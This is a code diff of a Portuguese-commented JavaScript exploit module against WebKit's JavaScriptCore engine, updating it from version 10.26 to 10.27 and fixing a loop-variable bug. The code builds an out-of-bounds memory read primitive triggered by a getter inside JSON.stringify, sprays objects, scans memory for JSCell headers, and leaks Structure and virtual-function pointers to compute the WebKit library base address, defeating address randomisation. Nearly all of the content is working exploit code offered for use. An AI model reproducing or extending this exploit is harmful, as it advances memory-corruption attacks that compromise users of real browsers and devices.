@@ -14,23 +14,23 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.26";
+const FNAME_MAIN = "ExploitLogic_v10.27"; // Versão atualizada
 
-const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_26";
+const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_27";
 const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
 const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;
 
-let getter_copy_called_flag_v10_26 = false;
+let getter_copy_called_flag_v10_27 = false;
 
 // ============================================================
 // PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
 // ============================================================
 async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
     const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
-    getter_copy_called_flag_v10_26 = false;
+    getter_copy_called_flag_v10_27 = false;
 
     if (!oob_array_buffer_real || !oob_dataview_real) {
         await triggerOOB_primitive();
@@ -43,7 +43,7 @@ async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
 
     const getterObjectForCopy = {
         get [GETTER_PROPERTY_NAME_COPY]() {
-            getter_copy_called_flag_v10_26 = true;
+            getter_copy_called_flag_v10_27 = true;
             try {
                 const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                 const effective_read_offset = qword_at_0x68.high();
@@ -54,22 +54,22 @@ async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
                     } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                 } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
             } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
-            return "getter_copy_v10_26_done";
+            return "getter_copy_v10_27_done";
         }
     };
     oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
     await PAUSE_S3(5);
     try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
-    if (!getter_copy_called_flag_v10_26) { return null; }
+    if (!getter_copy_called_flag_v10_27) { return null; }
     return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
 }
 
 // ============================================================
-// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.26 - Foco em Vazar Structure* e VFunc*)
+// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.27 - Foco em Vazar Structure* e VFunc*)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakStructureAndVFunc_v10.26`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Vazar Structure* e Ponteiro de Função Virtual (isZero fix) ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakStructureAndVFunc_v10.27`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Vazar Structure* e Ponteiro de Função Virtual (RefError fix) ---`, "test", FNAME_CURRENT_TEST);
 
     let sprayedObjects = [];
 
@@ -111,10 +111,9 @@ export async function sprayAndInvestigateObjectExposure() {
         const structurePtrOffsetFromCell = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; 
         const virtualPutOffsetFromStructure = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
 
-        for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
+        for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) { // Variável de loop é cell_base_offset
             let jscell_header = await readFromOOBOffsetViaCopy(cell_base_offset);
 
-            // CORREÇÃO da linha 118:
             const isCellHeaderZero = isAdvancedInt64Object(jscell_header) && jscell_header.low() === 0 && jscell_header.high() === 0;
             const isCellHeaderBadRead = isAdvancedInt64Object(jscell_header) && jscell_header.low() === 0xBADBAD && jscell_header.high() === 0xDEADDEAD;
             const isCellHeaderBadMagic = isAdvancedInt64Object(jscell_header) && jscell_header.low() === 0xBAD68BAD && jscell_header.high() === 0xBAD68BAD;
@@ -151,7 +150,6 @@ export async function sprayAndInvestigateObjectExposure() {
                                     logS3(`    [${toHex(cell_base_offset)}] SID=${toHex(structure_id_val)}, Structure*=${leaked_structure_ptr.toString(true)} -> VFunc*=${leaked_vfunc_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
 
                                     for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
-                                        // ... (lógica de cálculo de base como antes)
                                         const funcOffsetStr = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName];
                                         if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
                                         try {
@@ -160,7 +158,7 @@ export async function sprayAndInvestigateObjectExposure() {
                                             if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && potential_base_addr.high() < 0x7FFF0000 ) {
                                                 logS3(`      !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                                                 logS3(`        Ponteiro VFunc: ${leaked_vfunc_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
-                                                logS3(`        Corresponde a '${funcName}' (offset: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
+                                                logS3(`        Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
                                                 logS3(`        Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                                                 document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
                                                 webkitBaseLeaked = potential_base_addr;
@@ -175,8 +173,9 @@ export async function sprayAndInvestigateObjectExposure() {
                 }
             }
             if (webkitBaseLeaked) break;
-            if (offset > SCAN_START && offset % (SCAN_STEP * 128) === 0) { 
-                logS3(`    Scan de JSCell em ${toHex(offset)}...`, "info", FNAME_CURRENT_TEST);
+            // CORREÇÃO da linha 178: Usar cell_base_offset
+            if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 128) === 0) { 
+                logS3(`    Scan de JSCell em ${toHex(cell_base_offset)}...`, "info", FNAME_CURRENT_TEST);
                 await PAUSE_S3(1); 
             }
         }
